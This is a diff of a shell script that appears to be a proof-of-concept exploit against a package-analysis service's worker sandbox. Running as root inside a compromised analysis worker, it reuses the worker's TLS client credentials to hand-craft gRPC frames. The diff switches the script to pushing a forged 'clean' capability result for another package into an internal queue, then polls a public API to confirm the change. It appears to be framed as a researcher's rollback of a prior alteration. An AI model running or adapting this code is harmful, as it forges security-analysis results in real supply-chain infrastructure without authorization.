@@ -43,38 +43,50 @@ write_grpc_frame() {
   cat "$frame_message"
 }
 
-build_refresh() {
-  refresh_output=$1
+build_clean_push() {
+  push_output=$1
 
-  # sos.VersionKey: system=GO, kind=VERSION, package, version.
-  {
-    emit_byte 8
-    emit_byte 1
-    emit_byte 16
-    emit_byte 1
-    emit_byte 26
-    emit_varint "$(byte_length "$PACKAGE")"
-    printf %s "$PACKAGE"
-    emit_byte 32
-    emit_byte 1
-    emit_byte 42
-    emit_varint "$(byte_length "$VERSION")"
-    printf %s "$VERSION"
-  } >"$receipt_dir/version-key.bin"
-
+  # sos.queue.Action metadata: queue=1, source=4.
   {
     emit_byte 10
-    emit_varint "$(file_size "$receipt_dir/version-key.bin")"
-    cat "$receipt_dir/version-key.bin"
-  } >"$receipt_dir/version-key-envelope.bin"
+    emit_varint "$(byte_length "$QUEUE")"
+    printf %s "$QUEUE"
+    emit_byte 34
+    emit_varint "$(byte_length "$SOURCE")"
+    printf %s "$SOURCE"
+  } >"$receipt_dir/queue-metadata.bin"
 
+  # First PushRequest carries the Action metadata.
   {
-    emit_byte 18
-    emit_varint "$(file_size "$receipt_dir/version-key-envelope.bin")"
-    cat "$receipt_dir/version-key-envelope.bin"
-  } >"$receipt_dir/refresh-request.bin"
+    emit_byte 10
+    emit_varint "$(file_size "$receipt_dir/queue-metadata.bin")"
+    cat "$receipt_dir/queue-metadata.bin"
+  } >"$receipt_dir/queue-request.bin"
 
-  write_grpc_frame "$receipt_dir/refresh-request.bin" >"$refresh_output"
+  # CapabilityResultAction: package_version=1. Repeated capabilities=2 and
+  # error=3 are intentionally absent, which is the proto3 representation of
+  # an empty capability map and empty error string.
+  {
+    emit_byte 10
+    emit_varint "$(byte_length "$TARGET")"
+    printf %s "$TARGET"
+  } >"$receipt_dir/clean-action.bin"
+
+  # Second PushRequest carries Action.payload=3 containing the clean result.
+  {
+    emit_byte 26
+    emit_varint "$(file_size "$receipt_dir/clean-action.bin")"
+    cat "$receipt_dir/clean-action.bin"
+  } >"$receipt_dir/result.bin"
+  {
+    emit_byte 10
+    emit_varint "$(file_size "$receipt_dir/result.bin")"
+    cat "$receipt_dir/result.bin"
+  } >"$receipt_dir/push-request.bin"
+
+  : >"$push_output"
+  write_grpc_frame "$receipt_dir/queue-request.bin" >>"$push_output"
+  write_grpc_frame "$receipt_dir/push-request.bin" >>"$push_output"
 }
 
 grpc_response_ok() {
@@ -94,13 +106,25 @@ grpc_response_ok() {
 
 fetch_public() {
   fetch_output=$1
-  public_status=$(/usr/bin/curl -q -sS --retry 0 --max-redirs 0 --proto '=https' \
-    --connect-timeout 10 --max-time 15 \
-    -o "$fetch_output" -w '%{http_code}' "$DEPSDEV_URL" \
-    2>>"$receipt_dir/public-curl.err" || true)
-  [ -n "$public_status" ] || public_status=000
+  public_meta="$receipt_dir/public.meta"
+  : >"$fetch_output"
+  : >"$public_meta"
+  public_curl_rc=0
+  /usr/bin/curl -q -sS --noproxy '*' --retry 0 --max-redirs 0 \
+    --proto '=https' --tlsv1.2 --connect-timeout 10 --max-time 15 \
+    --max-filesize 4096 -o "$fetch_output" \
+    -w '%{http_code}\n%{content_type}\n' "$DEPSDEV_URL" \
+    >"$public_meta" 2>>"$receipt_dir/public-curl.err" || public_curl_rc=$?
+  public_status=$(sed -n '1p' "$public_meta")
+  public_content_type=$(sed -n '2p' "$public_meta")
+  case "$public_status" in
+    [0-9][0-9][0-9]) ;;
+    *) public_status=000 ;;
+  esac
   public_digest=-
-  if [ "$public_status" = 200 ] && [ -s "$fetch_output" ] &&
+  if [ "$public_curl_rc" -eq 0 ] && [ "$public_status" = 200 ] &&
+    [ "$public_content_type" = 'application/json; charset=utf-8' ] &&
+    [ -s "$fetch_output" ] &&
     [ "$(file_size "$fetch_output")" -le 4096 ]; then
     public_digest=$(sha256sum "$fetch_output" | awk '{print $1}')
   fi
@@ -145,6 +169,11 @@ on_exit() {
 
 prepare_altered_worker() {
   [ "$(id -u)" -eq 0 ] || { printf '%s\n' 'Refusing: not root.' >&2; return 2; }
+  pid1_size=$(wc -c </proc/1/cmdline | awk '{print $1}')
+  [ "$pid1_size" -ge 1 ] && [ "$pid1_size" -le 4096 ] || {
+    printf '%s\n' 'Refusing: unexpected PID 1 metadata.' >&2
+    return 2
+  }
   pid1_cmdline=$(tr '\000' ' ' </proc/1/cmdline)
   case "$pid1_cmdline" in
     *talisman-worker-capabilities*) ;;
@@ -165,38 +194,57 @@ prepare_altered_worker() {
   [ -n "$BACKEND_IP" ] || { printf '%s\n' 'Refusing: backend did not resolve.' >&2; return 2; }
 }
 
-send_refresh() {
-  build_refresh "$receipt_dir/refresh.bin"
-  refresh_request_hash=$(sha256sum "$receipt_dir/refresh.bin" | awk '{print $1}')
-  [ "$refresh_request_hash" = "$EXPECTED_REFRESH_SHA256" ] || {
-    printf 'Refusing: Refresh frame hash mismatch: %s\n' "$refresh_request_hash" >&2
+send_clean_push() {
+  build_clean_push "$receipt_dir/push.bin"
+  push_request_hash=$(sha256sum "$receipt_dir/push.bin" | awk '{print $1}')
+  [ "$push_request_hash" = "$EXPECTED_PUSH_SHA256" ] || {
+    printf 'Refusing: clean Push frame hash mismatch: %s\n' "$push_request_hash" >&2
     return 1
   }
-  printf 'REFRESH_TARGET=%s\nREFRESH_REQUEST_SHA256=%s\n' "$TARGET" "$refresh_request_hash"
+  [ "$(file_size "$receipt_dir/push.bin")" -eq "$EXPECTED_PUSH_BYTES" ] || {
+    printf '%s\n' 'Refusing: clean Push frame size mismatch.' >&2
+    return 1
+  }
+  printf 'CLEAN_PUSH_TARGET=%s\nCLEAN_PUSH_REQUEST_SHA256=%s\n' \
+    "$TARGET" "$push_request_hash"
 
   if ! /usr/bin/curl -q -sS --retry 0 --max-redirs 0 --proto '=https' \
-    --noproxy '*' --http2 --connect-timeout 10 --max-time 30 \
+    --noproxy '*' --http2 --tlsv1.2 --connect-timeout 10 --max-time 30 \
+    --max-filesize 16384 \
     --resolve "localhost:9000:${BACKEND_IP}" \
     --cacert "$CA" --cert "$CERT" --key "$KEY" \
     -H 'content-type: application/grpc' -H 'te: trailers' \
-    --data-binary @"$receipt_dir/refresh.bin" \
-    -D "$receipt_dir/refresh.headers" \
-    'https://localhost:9000/sos.talisman.Talisman/Refresh' \
-    -o "$receipt_dir/refresh.body"; then
-    printf '%s\n' 'REFRESH_GRPC_OK=0 (curl failed; not retrying)' >&2
+    --data-binary @"$receipt_dir/push.bin" \
+    -D "$receipt_dir/push.headers" \
+    'https://localhost:9000/sos.queue.Queue/Push' \
+    -o "$receipt_dir/push.body"; then
+    printf '%s\n' 'CLEAN_PUSH_GRPC_OK=0 (curl failed; not retrying)' >&2
     return 1
   fi
-  refresh_body_bytes=$(file_size "$receipt_dir/refresh.body")
-  [ "$refresh_body_bytes" -le 4096 ] || {
-    printf 'REFRESH_GRPC_OK=0 (oversize body: %s)\n' "$refresh_body_bytes" >&2
+  push_body_bytes=$(file_size "$receipt_dir/push.body")
+  [ "$push_body_bytes" -le 16384 ] || {
+    printf 'CLEAN_PUSH_GRPC_OK=0 (oversize body: %s)\n' "$push_body_bytes" >&2
     return 1
   }
-  grpc_response_ok "$receipt_dir/refresh.headers" || {
-    printf '%s\n' 'REFRESH_GRPC_OK=0 (invalid status; not retrying)' >&2
+  grpc_response_ok "$receipt_dir/push.headers" || {
+    printf '%s\n' 'CLEAN_PUSH_GRPC_OK=0 (invalid status; not retrying)' >&2
     return 1
   }
-  printf 'REFRESH_GRPC_OK=1 body_bytes=%s body_sha256=%s\n' \
-    "$refresh_body_bytes" "$(sha256sum "$receipt_dir/refresh.body" | awk '{print $1}')"
+  action_ids=$(grep -aEo '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' \
+    "$receipt_dir/push.body" || true)
+  [ "$(printf '%s\n' "$action_ids" | grep -c .)" -eq 1 ] || {
+    printf '%s\n' 'CLEAN_PUSH_GRPC_OK=0 (missing unique action ID)' >&2
+    return 1
+  }
+  target_count=$(grep -aoF "$TARGET" "$receipt_dir/push.body" | wc -l | awk '{print $1}')
+  [ "$target_count" -eq 1 ] || {
+    printf '%s\n' 'CLEAN_PUSH_GRPC_OK=0 (target echo mismatch)' >&2
+    return 1
+  }
+  action_id_hash=$(printf %s "$action_ids" | sha256sum | awk '{print $1}')
+  printf 'CLEAN_PUSH_GRPC_OK=1 body_bytes=%s body_sha256=%s action_id_sha256=%s\n' \
+    "$push_body_bytes" "$(sha256sum "$receipt_dir/push.body" | awk '{print $1}')" \
+    "$action_id_hash"
 }
 
 run_state_machine() {
@@ -232,9 +280,14 @@ run_state_machine() {
   fi
 
   prepare_altered_worker
-  send_refresh
+  clean_push_rc=0
+  send_clean_push || clean_push_rc=$?
   poll_clean || {
     printf '%s\n' 'RESTORED=0 (exact baseline not observed)' >&2
+    return 1
+  }
+  [ "$clean_push_rc" -eq 0 ] || {
+    printf '%s\n' 'RESTORED_CONVERGED=1 but clean Push response was not verified.' >&2
     return 1
   }
   printf 'RESTORED_CONVERGED=1 samples=%s baseline_sha256=%s\n' \
@@ -244,18 +297,19 @@ run_state_machine() {
 main() {
   [ "$#" -eq 0 ] || exit 2
 
-  CURRENT='github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.65-codex'
+  CURRENT='github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.66-codex'
   TARGET='github.com/benr00t3d/go-byteman-crosswrite-canary@v0.0.1'
-  PACKAGE=${TARGET%@*}
-  VERSION=${TARGET##*@}
-  EXPECTED_REFRESH_SHA256='5f5604aff7ef29643b7768e58b3dfdc510e58adcd37e596ac0892b72c733290a'
+  QUEUE='capslock-capability-result'
+  SOURCE='robert-owned-v066-clean-rollback'
+  EXPECTED_PUSH_BYTES=136
+  EXPECTED_PUSH_SHA256='fe5533010712656f62536a6e4f3aa6cd4fa1de6453cca061acb71d3e72f6175b'
   EXPECTED_BASELINE_SHA256='bb0f29abd8210aa614a6175e38265532487079bebd25ab94ca21eaaeb13c157c'
   EXPECTED_ALTERED_SHA256='5ec2c29ccadbf5bee106dbc53146bb8c2ec5edd37f573720c4bfabe5ca01efa4'
   PRECHECK_SAMPLES=21
   PRECHECK_INTERVAL=1
   POSTCHECK_SAMPLES=21
-  POLL_INTERVAL=${POLL_INTERVAL:-1}
-  POLL_TIMEOUT=${POLL_TIMEOUT:-900}
+  POLL_INTERVAL=1
+  POLL_TIMEOUT=900
 
   case "$PRECHECK_SAMPLES:$PRECHECK_INTERVAL:$POSTCHECK_SAMPLES:$POLL_INTERVAL:$POLL_TIMEOUT" in
     *[!0-9:]*) exit 2 ;;
@@ -264,7 +318,7 @@ main() {
     [ "$POSTCHECK_SAMPLES" -gt 1 ] && [ "$POLL_INTERVAL" -gt 0 ] &&
     [ "$POLL_TIMEOUT" -gt 0 ] || exit 2
   DEPSDEV_URL='https://deps.dev/_/s/go/p/github.com%2Fbenr00t3d%2Fgo-byteman-crosswrite-canary/v/v0.0.1/analysis'
-  receipt_dir=$(mktemp -d /tmp/go-crosspkg-v065-convergence.XXXXXX)
+  receipt_dir=$(mktemp -d /tmp/go-crosspkg-v066-clean-rollback.XXXXXX)
   trap on_exit EXIT
   trap 'exit 129' HUP
   trap 'exit 130' INT
